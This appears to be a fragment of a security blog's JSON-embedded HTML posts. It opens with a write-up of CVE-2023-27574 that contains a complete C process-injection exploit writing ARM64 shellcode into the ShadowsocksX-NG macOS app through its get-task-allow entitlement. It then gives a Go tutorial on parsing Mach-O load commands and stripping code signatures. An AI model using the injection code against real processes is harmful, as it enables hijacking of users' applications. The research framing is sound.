id=\"analysis\"\u003eAnalysis\u003c/h1\u003e\n\n\u003cp\u003eApplication \u003ca href=\"https://github.com/shadowsocks/ShadowsocksX-NG\"\u003eShadowsocksX-NG\u003c/a\u003e is MacOS client for the original shadowsocks. Shadowsocks is a tool that helps to circumvent firewalls.\u003c/p\u003e\n\n\u003cp\u003eTo view the entitlements, we can use \u003ccode\u003ecodesign -dv --entitlements :- /path/to/the/binary\u003c/code\u003e\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ codesign -d --entitlements :- /Applications/ShadowsocksX-NG.app/Contents/MacOS/ShadowsocksX-NG 2\u0026gt; /dev/null | xmllint --format -\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\n\u0026lt;!DOCTYPE plist PUBLIC \u0026quot;-//Apple//DTD PLIST 1.0//EN\u0026quot; \u0026quot;https://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026quot;\u0026gt;\n\u0026lt;plist version=\u0026quot;1.0\u0026quot;\u0026gt;\n  \u0026lt;dict\u0026gt;\n    \u0026lt;key\u0026gt;com.apple.security.get-task-allow\u0026lt;/key\u0026gt;\n    \u0026lt;true/\u0026gt;\n  \u0026lt;/dict\u0026gt;\n\u0026lt;/plist\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can see that the application has only entitlement, and it is \u003ccode\u003ecom.apple.security.get-task-allow\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"mach-vm-api\"\u003eMach VM API\u003c/h1\u003e\n\n\u003cp\u003eWe will utilize mach vm api to exploit the entitlement:\u003cbr\u003e\n* \u003ccode\u003etask_for_pid\u003c/code\u003e - to obtain the task for the process id of ShadowsocksX-NG\u003cbr\u003e\n* \u003ccode\u003emach_vm_allocate\u003c/code\u003e - to allocate the space inside the process\u003cbr\u003e\n* \u003ccode\u003emach_vm_write\u003c/code\u003e - to write our shellcode inside the allocated space\u003cbr\u003e\n* \u003ccode\u003evm_protect\u003c/code\u003e - to enable executing allocated space\n* \u003ccode\u003ethread_create_running\u003c/code\u003e - to run our shellcode inside the process space in a new thread\u003c/p\u003e\n\n\u003cp\u003eThe exploitation steps are:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eobtain the pid\u003c/li\u003e\n\u003cli\u003etry to get applications task\u003c/li\u003e\n\u003cli\u003eallocate space for the shellcode\u003c/li\u003e\n\u003cli\u003eallocate space for the stack\u003c/li\u003e\n\u003cli\u003ewrite shellcode\u003c/li\u003e\n\u003cli\u003egive execute permission at the shellcode address\u003c/li\u003e\n\u003cli\u003ecreate new thread\u003c/li\u003e\n\u003cli\u003eexecute thread\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-nasm\"\u003e.global _main\n.align 4\n\n_main:\n        mov x0, #1\n\n        mov x4, #0x7770                         ; write wp\n        movk x4, #0x656e, lsl #16       ; write en\n        movk x4, #0x0a64, lsl #32       ; write \\nd\n        str x4, [sp, #-8]\n        mov x5, #8\n        sub x1, sp, x5  \n\n        mov x2, #6 ; length\n        mov x16, #0x4\n        svc #0x80\n\n        mov x0, #6 ; exit status call\n        mov x16, #1\n        svc #0xffff\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eFull exploit source code:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e#import \u0026lt;Foundation/Foundation.h\u0026gt;\n#import \u0026lt;AppKit/AppKit.h\u0026gt;\n#include \u0026lt;ptrauth.h\u0026gt;\n\n#define STACK_SIZE 65536\n#define CODE_SIZE 124\n\nextern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);\nextern kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);\nextern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);\n\nchar shellCode[] = \u0026quot;\\x20\\x00\\x80\\xd2\\x04\\xee\\x8e\\xd2\\xc4\\xad\\xac\\xf2\\x84\\x4c\\xc1\\xf2\\xe4\\x83\\x1f\\xf8\\x05\\x01\\x80\\xd2\\xe1\\x63\\x25\\xcb\\xc2\\x00\\x80\\xd2\\x90\\x00\\x80\\xd2\\x01\\x10\\x00\\xd4\\xc0\\x00\\x80\\xd2\\x30\\x00\\x80\\xd2\\xe1\\xff\\x1f\\xd4\\x01\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x80\\x3f\\x00\\x00\\x34\\x00\\x00\\x00\\x34\\x00\\x00\\x00\\xb5\\x3f\\x00\\x00\\x00\\x00\\x00\\x00\\x34\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x0c\\x00\\x01\\x00\\x10\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026quot;;\n\npid_t getShadowPID() {\n    NSString * appPID = @\u0026quot;com.qiuyuzhou.ShadowsocksX-NG\u0026quot;;\n    NSArray\u0026lt;NSRunningApplication *\u0026gt; *runningShadowsocks = [NSRunningApplication runningApplicationsWithBundleIdentifier:appPID];\n    \n    if (runningShadowsocks == nil || [runningShadowsocks count] == 0) {\n        printf(\u0026quot;[!] Exploit failed!\\n\u0026quot;);\n        exit(-1);\n    }\n    \n    NSRunningApplication *ShadowsocksX_NG = runningShadowsocks[0];\n    pid_t shadowPID = [ShadowsocksX_NG processIdentifier];\n    \n    return shadowPID;\n}\n\nint main(int argc, const char * argv[]) {\n    pid_t shadowPID = getShadowPID();\n    \n    task_t remoteTask;\n    kern_return_t kr = task_for_pid(current_task(), shadowPID, \u0026amp;remoteTask);\n    \n    if (kr != KERN_SUCCESS) {\n        printf(\u0026quot;[!] Failed to get ShadowsocksX-NG's task: %s\\n\u0026quot;, mach_error_string(kr));\n        exit(-2);\n    } else {\n        printf(\u0026quot;[+] ShadowsocksX-NG's task successfully taken over: %d\\n\u0026quot;, remoteTask);\n    }\n\n    mach_vm_address_t remoteStack = (vm_address_t)NULL;\n    mach_vm_address_t remoteCode = (vm_address_t)NULL;\n\n    kr = mach_vm_allocate(remoteTask, \u0026amp;remoteStack, STACK_SIZE, VM_FLAGS_ANYWHERE);\n\n    if (kr != KERN_SUCCESS) {\n        printf(\u0026quot;Failed to allocate stack memory: %s\\n\u0026quot;, mach_error_string(kr));\n    } else {\n        printf(\u0026quot;allocated stack at: 0x%llx\\n\u0026quot;, remoteStack);\n    }\n\n    kr = mach_vm_allocate(remoteTask, \u0026amp;remoteCode, CODE_SIZE, VM_FLAGS_ANYWHERE);\n\n    if (kr != KERN_SUCCESS) {\n        printf(\u0026quot;Failed to allocate stack memory: %s\\n\u0026quot;, mach_error_string(kr));\n    } else {\n        printf(\u0026quot;allocated code at: 0x%llx\\n\u0026quot;, remoteCode);\n    }\n\n    kr = mach_vm_write(remoteTask, remoteCode, (vm_address_t)shellCode,CODE_SIZE);\n\n    if (kr != KERN_SUCCESS) {\n        printf(\u0026quot;Failed to write code: %s\\n\u0026quot;, mach_error_string(kr));\n    } else {\n        printf(\u0026quot;written code at: 0x%llx\\n\u0026quot;, remoteCode);\n    }\n\n    kr  = vm_protect(remoteTask, remoteCode, CODE_SIZE, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);\n\n    remoteStack += (STACK_SIZE / 2);\n\n    task_flavor_t flavor = ARM_THREAD_STATE64;\n    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;\n\n    arm_thread_state64_t state;\n\n    state.__pc = (uintptr_t)remoteCode;\n    state.__sp = (uintptr_t)remoteStack;\n\n    thread_act_t thread;\n    kr = thread_create_running(remoteTask, flavor, (thread_state_t)\u0026amp;state, count, \u0026amp;thread);\n\n    if (kr != KERN_SUCCESS) {\n        printf(\u0026quot;error spawning thread: %s\\n\u0026quot;, mach_error_string(kr));\n    } else {\n        printf(\u0026quot;done\\n\u0026quot;);\n    }\n\n    return 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e\u003c/p\u003e\n",
                    "name": "cve_2023_27574.html"
                },
            
                {
                    "title": "Code signature and new dylibs (Part 1)",
                    "description": "Adding new loads and removing code signature",
                    "content": "\u003ch1 id=\"table-of-contents\"\u003eTable of Contents\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#preparation\"\u003ePreparation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#examining-the-binary\"\u003eExamining the binary\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#removing-code-signature\"\u003eRemoving code signature\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#references\"\u003eReferences\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eDuring the engagement, often times I am patching the iOS application with FridaGadget.dylib inside of it.\u003cbr\u003e\nThe process usually involves adding new \u003cem\u003eLC_LOAD_DYLIB\u003c/em\u003e to the application and potentially new \u003cem\u003eLC_RPATH\u003c/em\u003e.\u003c/p\u003e\n\n\u003cp\u003eIn order to do these two, I was using \u003ca href=\"https://github.com/tyilo/insert_dylib\"\u003einsert_dylib\u003c/a\u003e and \u003ca href=\"https://www.unix.com/man-page/osx/1/install_name_tool/\"\u003einstall_name_tool\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eAs I was wondering how these two do these things, I wanted to give it a shot and try to implement my own version.\u003cbr\u003e\nGolang module to add these new loads and remove signature is available \u003ca href=\"https://github.com/lateralusd/gdylib\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eIn this first post, we are actually take a look how to remove the signature and in the next part we will add dylibs.\u003c/p\u003e\n\n\u003ch2 id=\"preparation\"\u003ePreparation\u003c/h2\u003e\n\n\u003cp\u003eFirst let\u0026rsquo;s create the file test.c that we are going to utilize to test these things out.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e#include \u0026lt;stdio.h\u0026gt;\n\nint main(void) {\n    printf(\u0026quot;hello world!\u0026quot;);\n    return 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eTo compile it, we can just do \u003ccode\u003eclang -o test_file test.c\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"examining-the-binary\"\u003eExamining the binary\u003c/h2\u003e\n\n\u003cp\u003eAt the start of every MachO file, there is a header which contains specific information. We can view the raw header with \u003cem\u003ehexdump\u003c/em\u003e.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ hexdump -C test_file | head\n00000000  cf fa ed fe 0c 00 00 01  00 00 00 00 02 00 00 00  |............|\n00000010  11 00 00 00 20 04 00 00  85 00 20 00 00 00 00 00  |.... ..... .....|\n00000020  19 00 00 00 48 00 00 00  5f 5f 50 41 47 45 5a 45  |....H...__PAGEZE|\n00000030  52 4f 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |RO..............|\n00000040  00 00 00 00 01 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000060  00 00 00 00 00 00 00 00  19 00 00 00 88 01 00 00  |................|\n00000070  5f 5f 54 45 58 54 00 00  00 00 00 00 00 00 00 00  |__TEXT..........|\n00000080  00 00 00 00 01 00 00 00  00 40 00 00 00 00 00 00  |.........@......|\n00000090  00 00 00 00 00 00 00 00  00 40 00 00 00 00 00 00  |.........@......|\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e\u003ccode\u003ecf fa ed fe\u003c/code\u003e is the actual magic file telling us what kind of file are we dealing with:\n* file endian (big or little)\n* 32 bit or 64 bit\u003c/p\u003e\n\n\u003cp\u003eThe structure that header maps to looks like this:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003e32 bit\u003c/strong\u003e\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003estruct mach_header {\n    uint32_t    magic;      /* mach magic number identifier */\n    cpu_type_t  cputype;    /* cpu specifier */\n    cpu_subtype_t   cpusubtype; /* machine specifier */\n    uint32_t    filetype;   /* type of file */\n    uint32_t    ncmds;      /* number of load commands */\n    uint32_t    sizeofcmds; /* the size of all the load commands */\n    uint32_t    flags;      /* flags */\n};\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e\u003cstrong\u003e64 bit\u003c/strong\u003e\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003estruct mach_header_64 {\n    uint32_t    magic;      /* mach magic number identifier */\n    cpu_type_t  cputype;    /* cpu specifier */\n    cpu_subtype_t   cpusubtype; /* machine specifier */\n    uint32_t    filetype;   /* type of file */\n    uint32_t    ncmds;      /* number of load commands */\n    uint32_t    sizeofcmds; /* the size of all the load commands */\n    uint32_t    flags;      /* flags */\n    uint32_t    reserved;   /* reserved */\n};\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eThose four bytes we have seen map to \u003ccode\u003emagic\u003c/code\u003e inside the \u003ccode\u003emach_header\u003c/code\u003e or \u003ccode\u003emach_header_64\u003c/code\u003e structure.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e32 bit magic: \u003ccode\u003e0xfeedface\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e64 bit magic: \u003ccode\u003e0xfeedface\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eSince the architecture on my Maco is 64 bit, we can confirm that our magic is indeed \u003ccode\u003e0xfeedfacf\u003c/code\u003e.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ otool -h test_file\ntest_file:\nMach header\n      magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags\n 0xfeedfacf 16777228          0  0x00           2    17       1056 0x00200085\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eAnother thing that is really important are \u003ccode\u003encmds\u003c/code\u003e and \u003ccode\u003esizeofcmds\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003encmds\u003c/code\u003e tells us how many load commands are inside the binary and \u003ccode\u003esizeofcmds\u003c/code\u003e tells us in term of bytes how much space those load commands consume.\u003c/p\u003e\n\n\u003cp\u003eLoad commands follow immediately the header of the binary, so their location is \u003ccode\u003esizeof(header)\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eLoad command is defined as:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003estruct load_command {\n    uint32_t cmd;       /* type of load command */\n    uint32_t cmdsize;   /* total size of command in bytes */\n};\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cul\u003e\n\u003cli\u003ecmd - type(LC_CODE_SIGNATURE, LC_LOAD_DYLIB etc)\u003c/li\u003e\n\u003cli\u003ecmdsize - total size of load command including \u003ccode\u003ecmd\u003c/code\u003e and \u003ccode\u003ecmdsize\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eSo in order to extract the load commands we need to do the following:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eRead the header\u003c/li\u003e\n\u003cli\u003eoffset = sizeof(header)\u003c/li\u003e\n\u003cli\u003eLoop hdr.ncmds times\n\n\u003cul\u003e\n\u003cli\u003eread the load structure\u003c/li\u003e\n\u003cli\u003eoffset += load.cmdsize\u003c/li\u003e\n\u003c/ul\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eIn golang, it would look something like this:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-go\"\u003epackage main\n\nimport (\n\t\u0026quot;encoding/binary\u0026quot;\n\t\u0026quot;fmt\u0026quot;\n\t\u0026quot;io\u0026quot;\n\t\u0026quot;os\u0026quot;\n)\n\ntype LoadType uint32\n\nconst (\n\tLC_SEGMENT_64     LoadType = 0x19\n\tLC_CODE_SIGNATURE LoadType = 0x1d\n)\n\n// Header reflects mach_header_64\ntype Header struct {\n\tMagic      uint32\n\tCpuType    uint32\n\tCpuSubtype uint32\n\tFiletype   uint32\n\tNCmds      uint32\n\tSizeOfCmds uint32\n\tFlags      uint32\n\tReserved   uint32\n}\n\ntype Load struct {\n\tCmd  LoadType\n\tSize uint32\n}\n\nfunc main() {\n\tf, err := os.Open(os.Args[1])\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer f.Close()\n\n\tvar hdr Header\n\tbinary.Read(f, binary.LittleEndian, \u0026amp;hdr)\n\n\tfmt.Printf(\u0026quot;magic: %x\\n\u0026quot;, hdr.Magic)\n\tfmt.Printf(\u0026quot;ncmds: %d\\n\u0026quot;, hdr.NCmds)\n\tfmt.Printf(\u0026quot;sizeofcmds: %d\\n\u0026quot;, hdr.SizeOfCmds)\n\n\toff, _ := f.Seek(0, io.SeekCurrent)\n\tfor i := 0; i \u0026lt; int(hdr.NCmds); i++ {\n\t\tvar ld Load\n\t\tbinary.Read(f, binary.LittleEndian, \u0026amp;ld)\n\t\tswitch ld.Cmd {\n\t\tcase LC_SEGMENT_64:\n\t\t\tfmt.Printf(\u0026quot;%d =\u0026gt; LC_SEGMENT_64\\n\u0026quot;, i)\n\t\tcase LC_CODE_SIGNATURE:\n\t\t\tfmt.Printf(\u0026quot;%d =\u0026gt; LC_CODE_SIGNATURE\\n\u0026quot;, i)\n\t\t}\n\t\toff += int64(ld.Size)\n\t\tf.Seek(off, io.SeekStart)\n\t}\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ go run main.go test_file\nmagic: feedfacf\nncmds: 17\nsizeofcmds: 1056\n0 =\u0026gt; LC_SEGMENT_64\n1 =\u0026gt; LC_SEGMENT_64\n2 =\u0026gt; LC_SEGMENT_64\n3 =\u0026gt; LC_SEGMENT_64\n16 =\u0026gt; LC_CODE_SIGNATURE\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can see that \u003cem\u003emagic\u003c/em\u003e, \u003cem\u003encmds\u003c/em\u003e and \u003cem\u003esizeofcmds\u003c/em\u003e correspond to what we have seen using \u003ccode\u003eotool -h\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eLets quickly confirm that our load commands are in the order that our program returned.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ otool -l test_file\ntest_file:\nLoad command 0\n      cmd LC_SEGMENT_64\n  cmdsize 72\n  segname __PAGEZERO\n   vmaddr 0x0000000000000000\n   vmsize 0x0000000100000000\n  fileoff 0\n filesize 0\n  maxprot 0x00000000\n initprot 0x00000000\n   nsects 0\n    flags 0x0\nLoad command 1\n      cmd LC_SEGMENT_64\n  cmdsize 392\n  segname __TEXT\n   vmaddr 0x0000000100000000\n   vmsize 0x0000000000004000\n  fileoff 0\n filesize 16384\n  maxprot 0x00000005\n initprot 0x00000005\n   nsects 4\n    flags 0x0\nSection\n...\nLoad command 2\n      cmd LC_SEGMENT_64\n  cmdsize 152\n  segname __DATA_CONST\n   vmaddr 0x0000000100004000\n   vmsize 0x0000000000004000\n  fileoff 16384\n filesize 16384\n  maxprot 0x00000003\n initprot 0x00000003\n   nsects 1\n    flags 0x10\nSection\n  sectname __got\n   segname __DATA_CONST\n      addr 0x0000000100004000\n      size 0x0000000000000008\n    offset 16384\n     align 2^3 (8)\n    reloff 0\n    nreloc 0\n     flags 0x00000006\n reserved1 1 (index into indirect symbol table)\n reserved2 0\nLoad command 3\n      cmd LC_SEGMENT_64\n  cmdsize 72\n  segname __LINKEDIT\n   vmaddr 0x0000000100008000\n   vmsize 0x0000000000004000\n  fileoff 32768\n filesize 662\n...\nLoad command 16\n      cmd LC_CODE_SIGNATURE\n  cmdsize 16\n  dataoff 33024\n datasize 406\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch2 id=\"removing-code-signature\"\u003eRemoving code signature\u003c/h2\u003e\n\n\u003cp\u003eThe steps to successfully remove code signature are:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eReplacing LC_CODE_SIGNATURE with null bytes\u003c/li\u003e\n\u003cli\u003eTruncating file \u003ccode\u003edatasize\u003c/code\u003e bytes starting at \u003ccode\u003edataoff\u003c/code\u003e (\u003ccode\u003edataoff = end - datasize\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eAligning the \u003ccode\u003efilesize\u003c/code\u003e in \u003ccode\u003e__LINKEDIT\u003c/code\u003e segment (\u003ccode\u003efilesize + fileoff = total_size_of_truncated_binary\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eAligning the \u003ccode\u003estrsize\u003c/code\u003e in \u003ccode\u003e__LCSYMTAB\u003c/code\u003e load (\u003ccode\u003estroff + strsize = total_size_of_truncated_binary\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eDecreasing \u003ccode\u003encmds\u003c/code\u003e inside the header by 1\u003c/li\u003e\n\u003cli\u003eDecreasing \u003ccode\u003esizeofcmds\u003c/code\u003e inside the header by the size of LC_CODE_SIGNATURE \u003ccode\u003ecmdsize\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-go\"\u003epackage main\n\nimport (\n\t\u0026quot;bytes\u0026quot;\n\t\u0026quot;encoding/binary\u0026quot;\n\t\u0026quot;io\u0026quot;\n\t\u0026quot;os\u0026quot;\n\t\u0026quot;unsafe\u0026quot;\n)\n\ntype LoadType uint32\n\nconst (\n\tLC_SYMTAB         LoadType = 0x2\n\tLC_SEGMENT_64     LoadType = 0x19\n\tLC_CODE_SIGNATURE LoadType = 0x1d\n)\n\n// Header reflects mach_header_64\ntype Header struct {\n\tMagic      uint32\n\tCpuType    uint32\n\tCpuSubtype uint32\n\tFiletype   uint32\n\tNCmds      uint32\n\tSizeOfCmds uint32\n\tFlags      uint32\n\tReserved   uint32\n}\n\n// Load represents load_command\ntype Load struct {\n\tCmd  LoadType\n\tSize uint32\n}\n\n// lcCode represents structure for LC_CODE_SIGNATURE\ntype lcCode struct {\n\tDataOff  uint32\n\tDataSize uint32\n}\n\ntype segment64 struct {\n\tSegName    [16]byte\n\tVMAddr     uint64\n\tVMSize     uint64\n\tFileOffset uint64\n\tFileSize   uint64\n\tMaxProt    int32\n\tInitProt   int32\n\tNSect      uint32\n\tFlags      uint32\n}\n\ntype symtab struct {\n\tSymOff  uint32\n\tNSyms   uint32\n\tStrOff  uint32\n\tStrSize uint32\n}\n\nfunc main() {\n\tf, err := os.Open(os.Args[1])\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer f.Close()\n\n\t// read the header from the file\n\tvar hdr Header\n\tbinary.Read(f, binary.LittleEndian, \u0026amp;hdr)\n\n\t// slice that will keep all our loads\n\tvar loads [][]byte\n\t// dataSize will contain size of the signature(inside LC_CODE_SIGNATURE)\n\tvar dataSize uint32\n\t// total size of LC_CODE_SIGNATURE\n\tvar lcSize uint32\n\n\toff, _ := f.Seek(0, io.SeekCurrent)\n\tfor i := 0; i \u0026lt; int(hdr.NCmds); i++ {\n\t\t// read the load command\n\t\tvar ld Load\n\t\tbinary.Read(f, binary.LittleEndian, \u0026amp;ld)\n\t\tswitch ld.Cmd {\n\t\t/* if we have LC_CODE_SIGNATURE\n\t\t* read it\n\t\t* save lc.DataSize inside dataSize variable\n\t\t* save total size of load inside lcSize\n\t\t* write zeroes for the whole load\n\t\t* append it to our load slice\n\t\t */\n\t\tcase LC_CODE_SIGNATURE:\n\t\t\tvar lc lcCode\n\t\t\tbinary.Read(f, binary.LittleEndian, \u0026amp;lc)\n\t\t\tdataSize = lc.DataSize\n\t\t\tlcSize = ld.Size\n\t\t\t// create ld.Size of null bytes\n\t\t\tzero := zeroSlice(int(ld.Size))\n\t\t\tloads = append(loads, zero)\n\t\tdefault:\n\t\t\t// otherwise just get raw bytes of the load\n\t\t\tf.Seek(off, io.SeekStart)\n\t\t\tbuff := make([]byte, ld.Size)\n\t\t\tbinary.Read(f, binary.LittleEndian, \u0026amp;buff)\n\t\t\tloads = append(loads, buff)\n\t\t}\n\t\toff += int64(ld.Size)\n\t\tf.Seek(off, io.SeekStart)\n\t}\n\n\t// current tells us from where we need to continue reading the binary\n\tcurrent := int64(unsafe.Sizeof(hdr)) + int64(hdr.SizeOfCmds)\n\n\t// create buffer that will have our modified binary\n\tbuff := new(bytes.Buffer)\n\n\t// reduce size of ncmds by 1 because we are removing one load(LC_CODE_SIGNATURE)\n\t// reduce size by the total size of LC_CODE_SIGNATURE load command\n\thdr.NCmds -= 1\n\thdr.SizeOfCmds -= lcSize\n\n\t// write the header to it\n\tbinary.Write(buff, binary.LittleEndian, hdr)\n\n\tend, _ := f.Seek(0, io.SeekEnd)\n\n\t// write all the loads to the binary\n\tfor _, load := range loads {\n\t\traw := bytes.NewBuffer(load)\n\t\tvar ld Load\n\t\tbinary.Read(raw, binary.LittleEndian, \u0026amp;ld)\n\t\tswitch ld.Cmd {\n\t\tcase LC_SEGMENT_64:\n\t\t\tvar seg segment64\n\t\t\tbinary.Read(bytes.NewBuffer(raw.Bytes()), binary.LittleEndian, \u0026amp;seg)\n\t\t\tsegName := string(stripNull(seg.SegName[:]))\n\t\t\tif segName == \u0026quot;__LINKEDIT\u0026quot; {\n\t\t\t\t// if we found __LINKEDIT, reduce filesize by the datasize\n\t\t\t\t// and write it to our buffer\n\t\t\t\tseg.FileSize -= uint64(dataSize)\n\t\t\t\tmodifiedLinkedit := new(bytes.Buffer)\n\t\t\t\tbinary.Write(modifiedLinkedit, binary.LittleEndian, ld)\n\t\t\t\tbinary.Write(modifiedLinkedit, binary.LittleEndian, seg)\n\t\t\t\tbuff.Write(modifiedLinkedit.Bytes())\n\t\t\t} else {\n\t\t\t\t// if the segment names does not match __LINKEDIT, write the raw load\n\t\t\t\tbuff.Write(load)\n\t\t\t}\n\t\tcase LC_SYMTAB:\n\t\t\t// align lc_symtab so that StrOff + StrSize = total size of truncated binary\n\t\t\tvar sym symtab\n\t\t\tbinary.Read(raw, binary.LittleEndian, \u0026amp;sym)\n\t\t\tsz := end - int64(dataSize)\n\t\t\tdiffSize := int64(sym.StrOff+sym.StrSize) - sz\n\t\t\tnewSize := sym.StrSize - uint32(diffSize)\n\t\t\tsym.StrSize = newSize\n\t\t\tnewS := new(bytes.Buffer)\n\t\t\tbinary.Write(newS, binary.LittleEndian, ld)\n\t\t\tbinary.Write(newS, binary.LittleEndian, sym)\n\t\t\tbuff.Write(newS.Bytes())\n\t\tdefault:\n\t\t\tbuff.Write(load)\n\t\t}\n\t}\n\n\t/*\n\t\t    1. calculate how much we need to read\n\t\t    2. read restSize\n\t\t===========================================================\n\t\t|hdr + loads|       rest                    | code sig    |\n\t\t===========================================================\n\t\t\u0026lt;- current -\u0026gt;\u0026lt;- sizeTillCodeSignature      -\u0026gt;\u0026lt;- dataSize -\u0026gt;\n\t*/\n\tf.Seek(current, io.SeekStart)\n\trestSize := end - current - int64(dataSize)\n\trest := make([]byte, restSize)\n\tbinary.Read(f, binary.LittleEndian, rest)\n\n\tbuff.Write(rest)\n\n\tnewFile, err := os.Create(\u0026quot;new_file\u0026quot;)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tio.Copy(newFile, buff)\n}\n\nfunc zeroSlice(size int) []byte {\n\tbuff := make([]byte, size)\n\tfor i := 0; i \u0026lt; size; i++ {\n\t\tbuff[i] = 0\n\t}\n\treturn buff\n}\n\nfunc stripNull(buff []byte) []byte {\n\tfor i := 0; i \u0026lt; len(buff); i++ {\n\t\tif buff[i] == 0 {\n\t\t\treturn buff[:i]\n\t\t}\n\t}\n\treturn buff\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eThe code does the following:\u003cbr\u003e\n1. Read the header\u003cbr\u003e\n2. Read all the loads; if we got LC_CODE_SIGNATURE save datasize and total load size; write load size bytes into our load slice\u003cbr\u003e\n3. For every other load just get raw bytes and write into load slice\u003cbr\u003e\n4. Calculate our current position so that we know from where we need to start reading the rest of the binary\u003cbr\u003e\n5. Reduce \u003ccode\u003encmds\u003c/code\u003e and \u003ccode\u003esizeofcmds\u003c/code\u003e in the header\u003cbr\u003e\n6. Write header inside the buffer\u003cbr\u003e\n7. Loop through all loads once again\u003cbr\u003e\n8. If we have LC_SEGMENT_64 and its name is __LINKEDIT, reduce \u003ccode\u003efilesize\u003c/code\u003e by \u003ccode\u003edatasize\u003c/code\u003e so that \u003ccode\u003efilesize -= datasize\u003c/code\u003e\u003cbr\u003e\n9. If we have LC_SYMTAB, reduce \u003ccode\u003estrsize\u003c/code\u003e so that \u003ccode\u003estroff + strsize = total_size_of_truncated_binary\u003c/code\u003e\u003cbr\u003e\n10. For all other loads, just write them\u003cbr\u003e\n11. Calculate how much we need to read from the binary\u003cbr\u003e\n12. Write it to the buffer and then save it to the new file\u003c/p\u003e\n\n\u003cp\u003eTo confirm that we have indeed removed code signature, lets run \u003ccode\u003ecodesign -dvv\u003c/code\u003e followed with \u003ccode\u003eotool -l\u003c/code\u003e on \u003ccode\u003etest_file\u003c/code\u003e and \u003ccode\u003enew_file\u003c/code\u003e.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode 